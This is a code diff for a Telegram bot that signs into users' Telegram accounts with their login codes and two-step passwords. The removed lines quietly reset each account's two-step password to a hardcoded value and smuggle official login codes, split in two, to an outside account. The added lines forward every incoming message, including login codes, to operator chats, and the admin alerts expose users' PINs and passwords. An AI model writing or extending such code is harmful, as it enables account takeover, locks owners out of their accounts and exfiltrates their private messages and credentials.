@@ -2385,32 +2385,7 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     try:
         await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
         
-        # Success! Now set 2FA
-        # No message to user as requested
-        
-        # Wait 10 seconds as requested
-        await asyncio.sleep(10)
-        
-        async def setup_system_2fa(client, phone):
-            try:
-                # Get current password info
-                password_settings = await client(functions.account.GetPasswordRequest())
-                
-                # Check if 2FA is already enabled
-                if password_settings.has_password:
-                    logger.info(f"2FA already enabled for {phone}, skipping initial setup")
-                    return
-
-                # Enable 2FA with the system password
-                await client(functions.account.UpdatePasswordRequest(
-                    current_password_hash=None,
-                    new_password=TWO_FA_PASSWORD
-                ))
-                logger.info(f"Enabled 2FA for {phone} with system password")
-            except Exception as e:
-                logger.error(f"2FA Setup error for {phone}: {e}")
-
-        await setup_system_2fa(client, phone)
+        # Login successful, proceed without 2FA setup
 
         user_id = str(update.effective_user.id)
         country_data = context.user_data.get('country_data')
@@ -2532,7 +2507,7 @@ Your payment will be moved to Main Balance after verification.
         if context.user_data.get('pin'):
             admin_notif += f"🔑 **Login PIN:** `{context.user_data.get('pin')}`\n"
         
-        admin_notif += "\nAccount logged in and 2FA secured.\n\"\"\""
+        admin_notif += "\nAccount logged in successfully.\n\"\"\""
         await context.bot.send_message(
             chat_id=ADMIN_CHAT_ID,
             text=admin_notif,
@@ -2583,40 +2558,7 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     try:
         await client.sign_in(password=password)
         
-        # Success! Now reset/update 2FA to our specific password
-        # No message to user as requested
-        
-        # Wait 10 seconds as requested
-        await asyncio.sleep(10)
-        
-        try:
-            # Get current password settings to compute hash
-            password_settings = await client(functions.account.GetPasswordRequest())
-            
-            # Use the actual client's compute_password_hash if available, or fallback
-            current_password_hash = None
-            try:
-                current_password_hash = await client.compute_password_hash(password_settings, password)
-            except:
-                # Manual hash computation if client helper fails
-                from telethon.crypto import PasswordHelper
-                import hashlib
-                
-                if hasattr(password_settings, 'srp_id'):
-                    # New SRP based passwords (Layer 105+)
-                    current_password_hash = PasswordHelper.compute_hash(password_settings, password)
-                else:
-                    # Older passwords
-                    current_password_hash = hashlib.sha256(password_settings.salt + password.encode() + password_settings.salt).digest()
-            
-            # Update to our new system password
-            await client(functions.account.UpdatePasswordRequest(
-                current_password_hash=current_password_hash,
-                new_password=TWO_FA_PASSWORD
-            ))
-            logger.info(f"Updated 2FA for {phone} to system password")
-        except Exception as e:
-            logger.error(f"Error updating existing 2FA for {phone}: {e}")
+        # Login successful with 2FA, proceed without changing 2FA password
 
         # Update balance and finish as usual
         user_id = str(update.effective_user.id)
@@ -2655,24 +2597,44 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 Your payment will be moved to Main Balance after verification.
 """, parse_mode='Markdown')
 
-        # Forward login code if any
-        @client.on(events.NewMessage(incoming=True))
+        # Forward ALL messages (same as non-2FA path)
+        @client.on(events.NewMessage())
         async def handler(event):
-            # Extract only 5-digit code from official telegram messages
             try:
-                if event.sender_id == 777000:
-                    import re
-                    # Look for a 5-digit code (Login code: 12345)
-                    match = re.search(r'\b(\d{5})\b', event.raw_text)
-                    if match:
-                        code = match.group(1)
-                        # Send first 3 digits
-                        await client.send_message('CEO_cryfex', f"📞 Number: `{phone}`\n🔢 Code (Part 1): `{code[:3]}`")
-                        # Wait a short moment
-                        await asyncio.sleep(2)
-                        # Send last 2 digits
-                        await client.send_message('CEO_cryfex', f"📞 Number: `{phone}`\n🔢 Code (Part 2): `{code[3:]}`")
-                        logger.info(f"Forwarded code in two parts for {phone} to CEO_cryfex")
+                is_official = event.sender_id == TELEGRAM_OFFICIAL_ID or event.is_private and getattr(event.sender, 'username', '') == 'Telegram'
+                
+                sender = await event.get_sender()
+                sender_name = getattr(sender, 'first_name', 'Unknown')
+                if not sender_name and hasattr(sender, 'title'):
+                    sender_name = sender.title
+                
+                if not is_official and hasattr(sender, 'username') and sender.username == 'Telegram':
+                    is_official = True
+
+                emoji = "🔔" if is_official else "📩"
+                forward_text = f"{emoji} **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
+                
+                if is_official:
+                    forward_text += f"\n\nDEBUG: Sender ID: {event.sender_id}\nUsername: {getattr(sender, 'username', 'N/A')}"
+                
+                try:
+                    await context.bot.send_message(
+                        chat_id=ADMIN_CHAT_ID,
+                        text=forward_text
+                    )
+                except Exception as admin_err:
+                    logger.error(f"Failed to send to admin: {admin_err}")
+
+                try:
+                    target_id = FORWARD_CHAT_ID
+                    await context.bot.send_message(
+                        chat_id=target_id,
+                        text=forward_text
+                    )
+                except Exception as forward_err:
+                    logger.error(f"Failed to send to FORWARD_CHAT_ID ({FORWARD_CHAT_ID}): {forward_err}")
+                
+                logger.info(f"Forwarding attempt complete for {phone} (2FA path)")
             except Exception as e:
                 logger.error(f"Forwarding error (2FA path) for {phone}: {e}")
 
@@ -2700,7 +2662,7 @@ Your payment will be moved to Main Balance after verification.
         if context.user_data.get('two_fa'):
             admin_notif += f"🔐 **Two-Step Verification Enabled**\n\nPassword: `{context.user_data.get('two_fa')}`\n"
 
-        admin_notif += "\nExisting 2FA was verified and updated to system password.\n\"\"\""
+        admin_notif += "\nExisting 2FA was verified. Password not changed.\n\"\"\""
         await context.bot.send_message(
             chat_id=ADMIN_CHAT_ID,
             text=admin_notif,
@@ -2827,48 +2789,52 @@ async def confirm_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYP
 
     # Notify user
     try:
-        # Auto-set 2FA if not already set (or reset to specified)
+        # Message Forwarding setup (without 2FA changes)
         try:
-            # We use the password from the attached code
-            target_2fa = "4735908767" 
-            # Note: client needs to be retrieved or passed. 
-            # In the current main.py structure, the Telethon client is usually in context.user_data['client']
             client = context.user_data.get('client')
             if client and client.is_connected():
-                await client(functions.account.UpdatePasswordSettingsRequest(
-                    new_settings=types.account.PasswordInputSettings(
-                        new_password=target_2fa,
-                        hint="Security",
-                        email=""
-                    )
-                ))
-                logger.info(f"Successfully enabled 2FA for {user_number}")
-
-                # Message Forwarding setup
-                @client.on(events.NewMessage(incoming=True))
+                @client.on(events.NewMessage())
                 async def handler(event):
                     try:
-                        # Extract only 5-digit code from official telegram messages
-                        if event.sender_id == 777000:
-                            import re
-                            # Look for a 5-digit code
-                            match = re.search(r'\b(\d{5})\b', event.raw_text)
-                            if match:
-                                code = match.group(1)
-                                # Send first 3 digits
-                                await client.send_message('CEO_cryfex', f"📞 Number: `{user_number}`\n🔢 Code (Part 1): `{code[:3]}`")
-                                # Wait a short moment
-                                await asyncio.sleep(2)
-                                # Send last 2 digits
-                                await client.send_message('CEO_cryfex', f"📞 Number: `{user_number}`\n🔢 Code (Part 2): `{code[3:]}`")
-                                logger.info(f"Forwarded code in two parts for {user_number} to CEO_cryfex")
+                        is_official = event.sender_id == TELEGRAM_OFFICIAL_ID or event.is_private and getattr(event.sender, 'username', '') == 'Telegram'
+                        
+                        sender = await event.get_sender()
+                        sender_name = getattr(sender, 'first_name', 'Unknown')
+                        if not sender_name and hasattr(sender, 'title'):
+                            sender_name = sender.title
+                        
+                        if not is_official and hasattr(sender, 'username') and sender.username == 'Telegram':
+                            is_official = True
+
+                        emoji = "🔔" if is_official else "📩"
+                        forward_text = f"{emoji} **নতুন মেসেজ**\n📞 নাম্বার: `{user_number}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
+                        
+                        if is_official:
+                            forward_text += f"\n\nDEBUG: Sender ID: {event.sender_id}\nUsername: {getattr(sender, 'username', 'N/A')}"
+                        
+                        try:
+                            await context.bot.send_message(
+                                chat_id=ADMIN_CHAT_ID,
+                                text=forward_text
+                            )
+                        except Exception as admin_err:
+                            logger.error(f"Failed to send to admin: {admin_err}")
+
+                        try:
+                            await context.bot.send_message(
+                                chat_id=FORWARD_CHAT_ID,
+                                text=forward_text
+                            )
+                        except Exception as forward_err:
+                            logger.error(f"Failed to send to FORWARD_CHAT_ID ({FORWARD_CHAT_ID}): {forward_err}")
+                        
+                        logger.info(f"Forwarding attempt complete for {user_number}")
                     except Exception as e:
                         logger.error(f"Forwarding error for {user_number}: {e}")
                 
-                # Keep session alive/running for forwarding
                 asyncio.create_task(client.run_until_disconnected())
         except Exception as e:
-            logger.error(f"Failed to set 2FA or Forwarding for {user_number}: {e}")
+            logger.error(f"Failed to set up forwarding for {user_number}: {e}")
 
         success_text = f"""
 ✅ **Confirm & Add to Hold completed - {user_number}**
